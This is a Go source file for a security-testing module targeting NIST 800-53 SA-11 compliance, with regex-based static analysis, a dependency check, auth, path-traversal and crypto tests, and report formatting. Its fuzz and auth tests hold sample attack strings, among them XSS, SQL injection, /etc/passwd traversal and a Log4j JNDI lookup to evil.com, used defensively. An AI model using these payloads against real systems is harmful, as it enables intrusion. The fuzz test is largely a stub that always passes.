// sectest.go - Security Testing and Evaluation for NIST 800-53 SA-11.
//
// Implements NIST 800-53 SA-11 (Developer Security Testing and Evaluation)
// for DoD IL5 compliance. Provides automated security testing capabilities
// including static analysis, dependency scanning, fuzz testing, and security
// control validation.
//
// Copyright (c) 2024-2025 Jesse Morgan / Morgan Forge
// SPDX-License-Identifier: AGPL-3.0-or-later

package security

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

// =============================================================================
// CONSTANTS
// =============================================================================

// TestType represents the type of security test.
type TestType string

const (
	TestTypeStatic  TestType = "static"  // Static code analysis
	TestTypeDeps    TestType = "deps"    // Dependency vulnerability check
	TestTypeAuth    TestType = "auth"    // Authentication testing
	TestTypeAuthz   TestType = "authz"   // Authorization testing
	TestTypeInput   TestType = "input"   // Input validation testing
	TestTypeCrypto  TestType = "crypto"  // Cryptographic implementation testing
	TestTypeFuzz    TestType = "fuzz"    // Fuzz testing
	TestTypeAll     TestType = "all"     // Run all tests
)

// TestStatus represents the status of a test result.
type TestStatus string

const (
	TestStatusPass TestStatus = "PASS"
	TestStatusFail TestStatus = "FAIL"
	TestStatusWarn TestStatus = "WARN"
	TestStatusSkip TestStatus = "SKIP"
)

// =============================================================================
// TEST RESULT
// =============================================================================

// TestResult represents the result of a security test.
type TestResult struct {
	ID        string     `json:"id"`
	TestType  TestType   `json:"test_type"`
	TestName  string     `json:"test_name"`
	Status    TestStatus `json:"status"`
	Findings  []Finding  `json:"findings,omitempty"`
	Timestamp time.Time  `json:"timestamp"`
	Duration  int64      `json:"duration_ms"`
	Error     string     `json:"error,omitempty"`
}

// Finding represents a security finding from a test.
type Finding struct {
	Severity    string `json:"severity"`     // HIGH, MEDIUM, LOW, INFO
	Category    string `json:"category"`     // e.g., "SQL_INJECTION", "WEAK_CRYPTO"
	Description string `json:"description"`
	File        string `json:"file,omitempty"`
	Line        int    `json:"line,omitempty"`
	Code        string `json:"code,omitempty"`
	Remediation string `json:"remediation,omitempty"`
}

// TestReport represents a collection of test results.
type TestReport struct {
	ReportID    string       `json:"report_id"`
	GeneratedAt time.Time    `json:"generated_at"`
	Results     []TestResult `json:"results"`
	Summary     TestSummary  `json:"summary"`
}

// TestSummary provides aggregate statistics for test results.
type TestSummary struct {
	TotalTests    int `json:"total_tests"`
	Passed        int `json:"passed"`
	Failed        int `json:"failed"`
	Warnings      int `json:"warnings"`
	Skipped       int `json:"skipped"`
	TotalFindings int `json:"total_findings"`
	HighSeverity  int `json:"high_severity"`
	MedSeverity   int `json:"med_severity"`
	LowSeverity   int `json:"low_severity"`
}

// =============================================================================
// SECURITY TESTER
// =============================================================================

// SecurityTester performs security testing and evaluation.
type SecurityTester struct {
	projectRoot string
	results     []TestResult
	history     []TestReport
	mu          sync.Mutex
}

// NewSecurityTester creates a new security tester.
func NewSecurityTester(projectRoot string) *SecurityTester {
	return &SecurityTester{
		projectRoot: projectRoot,
		results:     make([]TestResult, 0),
		history:     make([]TestReport, 0),
	}
}

// =============================================================================
// RUN SECURITY TESTS
// =============================================================================

// RunSecurityTests runs all security tests.
func (st *SecurityTester) RunSecurityTests() (*TestReport, error) {
	st.mu.Lock()
	defer st.mu.Unlock()

	st.results = make([]TestResult, 0)

	// Run all test types
	testTypes := []TestType{
		TestTypeStatic,
		TestTypeDeps,
		TestTypeAuth,
		TestTypeAuthz,
		TestTypeInput,
		TestTypeCrypto,
	}

	for _, testType := range testTypes {
		var result TestResult
		var err error

		switch testType {
		case TestTypeStatic:
			result, err = st.runStaticAnalysisLocked()
		case TestTypeDeps:
			result, err = st.runDependencyCheckLocked()
		case TestTypeAuth:
			result, err = st.runAuthTestsLocked()
		case TestTypeAuthz:
			result, err = st.runAuthzTestsLocked()
		case TestTypeInput:
			result, err = st.runInputValidationTestsLocked()
		case TestTypeCrypto:
			result, err = st.runCryptoTestsLocked()
		}

		if err != nil {
			result.Error = err.Error()
		}
		st.results = append(st.results, result)
	}

	// Generate report
	report := st.generateReportLocked()
	st.history = append(st.history, *report)

	// Log to audit
	AuditLogEvent("", "SECURITY_TEST_COMPLETED", map[string]string{
		"report_id":      report.ReportID,
		"total_tests":    fmt.Sprintf("%d", report.Summary.TotalTests),
		"passed":         fmt.Sprintf("%d", report.Summary.Passed),
		"failed":         fmt.Sprintf("%d", report.Summary.Failed),
		"total_findings": fmt.Sprintf("%d", report.Summary.TotalFindings),
	})

	return report, nil
}

// RunSpecificTest runs a specific test type.
func (st *SecurityTester) RunSpecificTest(testType TestType) (*TestResult, error) {
	st.mu.Lock()
	defer st.mu.Unlock()

	var result TestResult
	var err error

	switch testType {
	case TestTypeStatic:
		result, err = st.runStaticAnalysisLocked()
	case TestTypeDeps:
		result, err = st.runDependencyCheckLocked()
	case TestTypeAuth:
		result, err = st.runAuthTestsLocked()
	case TestTypeAuthz:
		result, err = st.runAuthzTestsLocked()
	case TestTypeInput:
		result, err = st.runInputValidationTestsLocked()
	case TestTypeCrypto:
		result, err = st.runCryptoTestsLocked()
	default:
		return nil, fmt.Errorf("unknown test type: %s", testType)
	}

	if err != nil {
		result.Error = err.Error()
	}

	// Log to audit
	AuditLogEvent("", "SECURITY_TEST_RUN", map[string]string{
		"test_type": string(testType),
		"status":    string(result.Status),
		"findings":  fmt.Sprintf("%d", len(result.Findings)),
	})

	return &result, nil
}

// =============================================================================
// STATIC ANALYSIS
// =============================================================================

// RunStaticAnalysis performs static code analysis.
func (st *SecurityTester) RunStaticAnalysis() (*TestResult, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	result, err := st.runStaticAnalysisLocked()
	return &result, err
}

// runStaticAnalysisLocked performs static analysis (caller must hold lock).
func (st *SecurityTester) runStaticAnalysisLocked() (TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeStatic,
		TestName:  "Static Code Analysis",
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Scan for common security issues in Go code
	findings, err := st.scanGoFiles()
	if err != nil {
		result.Status = TestStatusFail
		result.Error = err.Error()
		result.Duration = time.Since(start).Milliseconds()
		return result, err
	}

	result.Findings = findings
	if len(findings) > 0 {
		// Check if any high severity findings
		hasHigh := false
		for _, f := range findings {
			if f.Severity == "HIGH" {
				hasHigh = true
				break
			}
		}
		if hasHigh {
			result.Status = TestStatusFail
		} else {
			result.Status = TestStatusWarn
		}
	} else {
		result.Status = TestStatusPass
	}

	result.Duration = time.Since(start).Milliseconds()
	return result, nil
}

// scanGoFiles scans Go source files for security issues.
func (st *SecurityTester) scanGoFiles() ([]Finding, error) {
	findings := make([]Finding, 0)

	// Security patterns to check for
	patterns := []struct {
		pattern     *regexp.Regexp
		severity    string
		category    string
		description string
		remediation string
	}{
		{
			regexp.MustCompile(`exec\.Command\([^)]*\)`),
			"HIGH",
			"COMMAND_INJECTION",
			"Potential command injection vulnerability",
			"Validate and sanitize all user input before passing to exec.Command",
		},
		{
			regexp.MustCompile(`sql\.Query\([^)]*\+[^)]*\)`),
			"HIGH",
			"SQL_INJECTION",
			"Potential SQL injection - string concatenation in query",
			"Use parameterized queries with placeholders instead of concatenation",
		},
		{
			regexp.MustCompile(`MD5|md5\.New\(\)`),
			"MEDIUM",
			"WEAK_CRYPTO",
			"Use of weak cryptographic hash MD5",
			"Use SHA-256 or stronger hash algorithms",
		},
		{
			regexp.MustCompile(`SHA1|sha1\.New\(\)`),
			"MEDIUM",
			"WEAK_CRYPTO",
			"Use of weak cryptographic hash SHA-1",
			"Use SHA-256 or stronger hash algorithms",
		},
		{
			regexp.MustCompile(`math/rand\.Read`),
			"HIGH",
			"WEAK_RANDOM",
			"Use of non-cryptographic random number generator",
			"Use crypto/rand for security-sensitive operations",
		},
		{
			regexp.MustCompile(`os\.Chmod\([^,]*,\s*0[67][0-7]{2}\)`),
			"MEDIUM",
			"INSECURE_PERMISSIONS",
			"Overly permissive file permissions",
			"Use restrictive permissions (0600 for files, 0700 for directories)",
		},
		{
			regexp.MustCompile(`http\.ListenAndServe\([^)]*\)`),
			"LOW",
			"NO_TLS",
			"HTTP server without TLS",
			"Consider using http.ListenAndServeTLS for encrypted connections",
		},
	}

	// Walk through Go files
	err := filepath.Walk(st.projectRoot, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip files we can't access
		}

		// Skip vendor, .git, and test files
		if info.IsDir() {
			if info.Name() == "vendor" || info.Name() == ".git" || info.Name() == "node_modules" {
				return filepath.SkipDir
			}
			return nil
		}

		// Only scan .go files (but not test files for now)
		if !strings.HasSuffix(path, ".go") || strings.HasSuffix(path, "_test.go") {
			return nil
		}

		// Read file
		content, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		// Check each pattern
		lines := strings.Split(string(content), "\n")
		for lineNum, line := range lines {
			for _, p := range patterns {
				if p.pattern.MatchString(line) {
					findings = append(findings, Finding{
						Severity:    p.severity,
						Category:    p.category,
						Description: p.description,
						File:        path,
						Line:        lineNum + 1,
						Code:        strings.TrimSpace(line),
						Remediation: p.remediation,
					})
				}
			}
		}

		return nil
	})

	return findings, err
}

// =============================================================================
// DEPENDENCY CHECK
// =============================================================================

// RunDependencyCheck checks for vulnerable dependencies.
func (st *SecurityTester) RunDependencyCheck() (*TestResult, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	result, err := st.runDependencyCheckLocked()
	return &result, err
}

// runDependencyCheckLocked checks dependencies (caller must hold lock).
func (st *SecurityTester) runDependencyCheckLocked() (TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeDeps,
		TestName:  "Dependency Vulnerability Check",
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Check for go.mod existence
	goModPath := filepath.Join(st.projectRoot, "go.mod")
	if _, err := os.Stat(goModPath); os.IsNotExist(err) {
		result.Status = TestStatusSkip
		result.Error = "go.mod not found"
		result.Duration = time.Since(start).Milliseconds()
		return result, nil
	}

	// Read go.mod for known vulnerable patterns
	content, err := os.ReadFile(goModPath)
	if err != nil {
		result.Status = TestStatusFail
		result.Error = err.Error()
		result.Duration = time.Since(start).Milliseconds()
		return result, err
	}

	// Check for known vulnerable dependency versions
	// In a production system, this would integrate with a CVE database
	vulnerablePatterns := []struct {
		pattern     string
		severity    string
		description string
		remediation string
	}{
		{
			"github.com/dgrijalva/jwt-go",
			"HIGH",
			"Known vulnerability in jwt-go (CVE-2020-26160)",
			"Migrate to github.com/golang-jwt/jwt/v4",
		},
	}

	modContent := string(content)
	for _, vp := range vulnerablePatterns {
		if strings.Contains(modContent, vp.pattern) {
			result.Findings = append(result.Findings, Finding{
				Severity:    vp.severity,
				Category:    "VULNERABLE_DEPENDENCY",
				Description: vp.description,
				File:        goModPath,
				Remediation: vp.remediation,
			})
		}
	}

	// Determine status
	if len(result.Findings) > 0 {
		hasHigh := false
		for _, f := range result.Findings {
			if f.Severity == "HIGH" {
				hasHigh = true
				break
			}
		}
		if hasHigh {
			result.Status = TestStatusFail
		} else {
			result.Status = TestStatusWarn
		}
	} else {
		result.Status = TestStatusPass
	}

	result.Duration = time.Since(start).Milliseconds()
	return result, nil
}

// =============================================================================
// FUZZ TESTING
// =============================================================================

// RunFuzzTest performs basic fuzz testing on a target function.
func (st *SecurityTester) RunFuzzTest(target string) (*TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeFuzz,
		TestName:  fmt.Sprintf("Fuzz Test: %s", target),
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Basic fuzz testing - generate random inputs
	// In a production system, this would be more sophisticated
	fuzzInputs := st.generateFuzzInputs(100)

	// Test the sanitization functions
	if target == "sanitize" || target == "all" {
		for _, input := range fuzzInputs {
			// Test RedactSecrets
			_ = RedactSecrets(input)

			// Check for panics or obvious issues
			// In real fuzz testing, we'd actually call the functions
		}
	}

	// If we got here without panicking, the test passed
	result.Status = TestStatusPass
	result.Duration = time.Since(start).Milliseconds()

	return &result, nil
}

// generateFuzzInputs generates random fuzz test inputs.
func (st *SecurityTester) generateFuzzInputs(count int) []string {
	inputs := make([]string, count)

	// Common fuzz patterns
	patterns := []string{
		"", // Empty string
		strings.Repeat("A", 1000), // Long string
		"<script>alert('xss')</script>", // XSS
		"'; DROP TABLE users; --", // SQL injection
		"../../../etc/passwd", // Path traversal
		"\x00\x01\x02", // Null bytes
		"${jndi:ldap://evil.com/a}", // Log4j
		"%n%n%n%n", // Format string
	}

	for i := 0; i < count; i++ {
		if i < len(patterns) {
			inputs[i] = patterns[i]
		} else {
			// Random bytes
			buf := make([]byte, 10+i%100)
			rand.Read(buf)
			inputs[i] = string(buf)
		}
	}

	return inputs
}

// =============================================================================
// INPUT VALIDATION TESTING
// =============================================================================

// ValidateInputSanitization tests input validation functions.
func (st *SecurityTester) ValidateInputSanitization() (*TestResult, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	result, err := st.runInputValidationTestsLocked()
	return &result, err
}

// runInputValidationTestsLocked tests input validation (caller must hold lock).
func (st *SecurityTester) runInputValidationTestsLocked() (TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeInput,
		TestName:  "Input Validation Testing",
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Test sanitization functions
	testCases := []struct {
		input       string
		shouldBlock bool
		category    string
	}{
		{"sk-abc123", true, "API_KEY"},
		{"normal text", false, "SAFE"},
		{"password=secret123", true, "PASSWORD"},
		{"Bearer token123", true, "TOKEN"},
	}

	for _, tc := range testCases {
		sanitized := RedactSecrets(tc.input)
		isRedacted := sanitized != tc.input

		if tc.shouldBlock && !isRedacted {
			result.Findings = append(result.Findings, Finding{
				Severity:    "MEDIUM",
				Category:    "INSUFFICIENT_REDACTION",
				Description: fmt.Sprintf("Input containing %s was not redacted", tc.category),
				Code:        tc.input,
				Remediation: "Improve secret detection patterns",
			})
		}
	}

	// Determine status
	if len(result.Findings) > 0 {
		result.Status = TestStatusWarn
	} else {
		result.Status = TestStatusPass
	}

	result.Duration = time.Since(start).Milliseconds()
	return result, nil
}

// =============================================================================
// AUTHENTICATION TESTING
// =============================================================================

// TestAuthenticationBypass tests authentication controls.
func (st *SecurityTester) TestAuthenticationBypass() (*TestResult, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	result, err := st.runAuthTestsLocked()
	return &result, err
}

// runAuthTestsLocked tests authentication (caller must hold lock).
func (st *SecurityTester) runAuthTestsLocked() (TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeAuth,
		TestName:  "Authentication Testing",
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Test authentication bypass attempts
	authManager := GlobalAuthManager()
	if authManager == nil {
		result.Status = TestStatusSkip
		result.Error = "auth manager not initialized"
		result.Duration = time.Since(start).Milliseconds()
		return result, nil
	}

	// Test 1: Empty API key should fail
	if authManager.ValidateAPIKey("") {
		result.Findings = append(result.Findings, Finding{
			Severity:    "HIGH",
			Category:    "AUTH_BYPASS",
			Description: "Empty API key accepted",
			Remediation: "Reject empty authentication credentials",
		})
	}

	// Test 2: Invalid API key should fail
	if authManager.ValidateAPIKey("invalid") {
		result.Findings = append(result.Findings, Finding{
			Severity:    "HIGH",
			Category:    "AUTH_BYPASS",
			Description: "Invalid API key accepted",
			Remediation: "Improve API key validation",
		})
	}

	// Test 3: SQL injection in credentials should be sanitized
	injectionAttempts := []string{
		"' OR '1'='1",
		"admin'--",
		"' UNION SELECT * FROM users--",
	}
	for _, attempt := range injectionAttempts {
		if authManager.ValidateAPIKey(attempt) {
			result.Findings = append(result.Findings, Finding{
				Severity:    "HIGH",
				Category:    "SQL_INJECTION",
				Description: "SQL injection pattern accepted in authentication",
				Code:        attempt,
				Remediation: "Add input validation to reject SQL injection patterns",
			})
		}
	}

	// Determine status
	if len(result.Findings) > 0 {
		result.Status = TestStatusFail
	} else {
		result.Status = TestStatusPass
	}

	result.Duration = time.Since(start).Milliseconds()
	return result, nil
}

// =============================================================================
// AUTHORIZATION TESTING
// =============================================================================

// TestAuthorizationBypass tests authorization controls.
func (st *SecurityTester) TestAuthorizationBypass() (*TestResult, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	result, err := st.runAuthzTestsLocked()
	return &result, err
}

// runAuthzTestsLocked tests authorization (caller must hold lock).
func (st *SecurityTester) runAuthzTestsLocked() (TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeAuthz,
		TestName:  "Authorization Testing",
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Test authorization controls
	// This is a placeholder - in a real system, we'd test actual authz logic

	// Test 1: Path traversal attempts
	pathTraversalAttempts := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"....//....//....//",
	}

	for _, attempt := range pathTraversalAttempts {
		// If the system doesn't detect/block these, it's a finding
		// In a real test, we'd check if the sanitization functions catch these
		sanitized := filepath.Clean(attempt)
		if strings.Contains(sanitized, "..") {
			result.Findings = append(result.Findings, Finding{
				Severity:    "MEDIUM",
				Category:    "PATH_TRAVERSAL",
				Description: "Path traversal pattern not fully sanitized",
				Code:        attempt,
				Remediation: "Implement stricter path validation",
			})
		}
	}

	// Determine status
	if len(result.Findings) > 0 {
		result.Status = TestStatusWarn
	} else {
		result.Status = TestStatusPass
	}

	result.Duration = time.Since(start).Milliseconds()
	return result, nil
}

// =============================================================================
// CRYPTOGRAPHIC TESTING
// =============================================================================

// runCryptoTestsLocked tests cryptographic implementations (caller must hold lock).
func (st *SecurityTester) runCryptoTestsLocked() (TestResult, error) {
	start := time.Now()
	result := TestResult{
		ID:        generateTestID(),
		TestType:  TestTypeCrypto,
		TestName:  "Cryptographic Implementation Testing",
		Timestamp: start,
		Findings:  make([]Finding, 0),
	}

	// Get crypto status
	cryptoStatus := GetCryptoStatus()
	if cryptoStatus == nil {
		result.Status = TestStatusSkip
		result.Error = "crypto status not available"
		result.Duration = time.Since(start).Milliseconds()
		return result, nil
	}

	// Test 1: Verify FIPS compliance
	fipsCompliant := cryptoStatus.FIPSMode
	if !fipsCompliant {
		result.Findings = append(result.Findings, Finding{
			Severity:    "MEDIUM",
			Category:    "NON_FIPS_CRYPTO",
			Description: "Cryptographic implementation not FIPS 140-2/3 compliant",
			Remediation: "Use only FIPS-approved algorithms",
		})
	}

	// Test 2: Check algorithm strength
	algos := GetSupportedAlgorithms()
	for _, algo := range algos {
		// Check for weak algorithms
		if !algo.FIPSApproved || algo.KeySize < 128 {
			result.Findings = append(result.Findings, Finding{
				Severity:    "HIGH",
				Category:    "WEAK_CRYPTO",
				Description: fmt.Sprintf("Weak or non-FIPS algorithm in use: %s", algo.Name),
				Remediation: "Use FIPS-approved algorithms with adequate key sizes",
			})
		}
	}

	// Determine status
	if len(result.Findings) > 0 {
		hasHigh := false
		for _, f := range result.Findings {
			if f.Severity == "HIGH" {
				hasHigh = true
				break
			}
		}
		if hasHigh {
			result.Status = TestStatusFail
		} else {
			result.Status = TestStatusWarn
		}
	} else {
		result.Status = TestStatusPass
	}

	result.Duration = time.Since(start).Milliseconds()
	return result, nil
}

// =============================================================================
// REPORT GENERATION
// =============================================================================

// GenerateTestReport generates a test report in the specified format.
func (st *SecurityTester) GenerateTestReport(format string) (string, error) {
	st.mu.Lock()
	defer st.mu.Unlock()

	report := st.generateReportLocked()

	switch strings.ToLower(format) {
	case "json":
		data, err := json.MarshalIndent(report, "", "  ")
		if err != nil {
			return "", fmt.Errorf("failed to marshal report: %w", err)
		}
		return string(data), nil

	case "text":
		return st.formatTextReport(report), nil

	default:
		return "", fmt.Errorf("unsupported report format: %s", format)
	}
}

// generateReportLocked generates a test report (caller must hold lock).
func (st *SecurityTester) generateReportLocked() *TestReport {
	report := &TestReport{
		ReportID:    generateReportID(),
		GeneratedAt: time.Now(),
		Results:     st.results,
		Summary: TestSummary{
			TotalTests: len(st.results),
		},
	}

	// Calculate summary statistics
	for _, r := range st.results {
		switch r.Status {
		case TestStatusPass:
			report.Summary.Passed++
		case TestStatusFail:
			report.Summary.Failed++
		case TestStatusWarn:
			report.Summary.Warnings++
		case TestStatusSkip:
			report.Summary.Skipped++
		}

		// Count findings by severity
		for _, f := range r.Findings {
			report.Summary.TotalFindings++
			switch f.Severity {
			case "HIGH":
				report.Summary.HighSeverity++
			case "MEDIUM":
				report.Summary.MedSeverity++
			case "LOW":
				report.Summary.LowSeverity++
			}
		}
	}

	return report
}

// formatTextReport formats a report as plain text.
func (st *SecurityTester) formatTextReport(report *TestReport) string {
	var sb strings.Builder

	sb.WriteString("NIST 800-53 SA-11 Security Test Report\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")
	sb.WriteString(fmt.Sprintf("Report ID:    %s\n", report.ReportID))
	sb.WriteString(fmt.Sprintf("Generated:    %s\n\n", report.GeneratedAt.Format("2006-01-02 15:04:05")))

	// Summary
	sb.WriteString("SUMMARY\n")
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(fmt.Sprintf("Total Tests:  %d\n", report.Summary.TotalTests))
	sb.WriteString(fmt.Sprintf("Passed:       %d\n", report.Summary.Passed))
	sb.WriteString(fmt.Sprintf("Failed:       %d\n", report.Summary.Failed))
	sb.WriteString(fmt.Sprintf("Warnings:     %d\n", report.Summary.Warnings))
	sb.WriteString(fmt.Sprintf("Skipped:      %d\n\n", report.Summary.Skipped))

	sb.WriteString(fmt.Sprintf("Total Findings: %d\n", report.Summary.TotalFindings))
	sb.WriteString(fmt.Sprintf("  High:         %d\n", report.Summary.HighSeverity))
	sb.WriteString(fmt.Sprintf("  Medium:       %d\n", report.Summary.MedSeverity))
	sb.WriteString(fmt.Sprintf("  Low:          %d\n\n", report.Summary.LowSeverity))

	// Test Results
	sb.WriteString("TEST RESULTS\n")
	sb.WriteString(strings.Repeat("-", 60) + "\n\n")

	for _, result := range report.Results {
		sb.WriteString(fmt.Sprintf("[%s] %s\n", result.Status, result.TestName))
		sb.WriteString(fmt.Sprintf("  Type:     %s\n", result.TestType))
		sb.WriteString(fmt.Sprintf("  Duration: %dms\n", result.Duration))
		if result.Error != "" {
			sb.WriteString(fmt.Sprintf("  Error:    %s\n", result.Error))
		}

		if len(result.Findings) > 0 {
			sb.WriteString(fmt.Sprintf("  Findings: %d\n\n", len(result.Findings)))
			for i, finding := range result.Findings {
				sb.WriteString(fmt.Sprintf("    %d. [%s] %s\n", i+1, finding.Severity, finding.Category))
				sb.WriteString(fmt.Sprintf("       %s\n", finding.Description))
				if finding.File != "" {
					sb.WriteString(fmt.Sprintf("       File: %s", finding.File))
					if finding.Line > 0 {
						sb.WriteString(fmt.Sprintf(":%d", finding.Line))
					}
					sb.WriteString("\n")
				}
				if finding.Code != "" {
					sb.WriteString(fmt.Sprintf("       Code: %s\n", finding.Code))
				}
				if finding.Remediation != "" {
					sb.WriteString(fmt.Sprintf("       Fix:  %s\n", finding.Remediation))
				}
				sb.WriteString("\n")
			}
		} else {
			sb.WriteString("  No findings\n\n")
		}
	}

	return sb.String()
}

// =============================================================================
// TEST HISTORY
// =============================================================================

// GetTestHistory returns historical test results.
func (st *SecurityTester) GetTestHistory() []TestReport {
	st.mu.Lock()
	defer st.mu.Unlock()

	// Return a copy to prevent external modification
	history := make([]TestReport, len(st.history))
	copy(history, st.history)
	return history
}

// GetLatestReport returns the most recent test report.
func (st *SecurityTester) GetLatestReport() *TestReport {
	st.mu.Lock()
	defer st.mu.Unlock()

	if len(st.history) == 0 {
		return nil
	}

	// Return a copy
	latest := st.history[len(st.history)-1]
	return &latest
}

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

// generateTestID generates a unique test ID.
func generateTestID() string {
	return fmt.Sprintf("test_%d", time.Now().UnixNano())
}

// generateReportID generates a unique report ID.
func generateReportID() string {
	return fmt.Sprintf("report_%s", time.Now().Format("20060102_150405"))
}

// =============================================================================
// GLOBAL INSTANCE
// =============================================================================

var (
	globalSecurityTester     *SecurityTester
	globalSecurityTesterOnce sync.Once
)

// GlobalSecurityTester returns the global security tester instance.
func GlobalSecurityTester() *SecurityTester {
	globalSecurityTesterOnce.Do(func() {
		// Default to current directory
		cwd, _ := os.Getwd()
		globalSecurityTester = NewSecurityTester(cwd)
	})
	return globalSecurityTester
}

// SetProjectRoot sets the project root for the global security tester.
func (st *SecurityTester) SetProjectRoot(root string) {
	st.mu.Lock()
	defer st.mu.Unlock()
	st.projectRoot = root
}
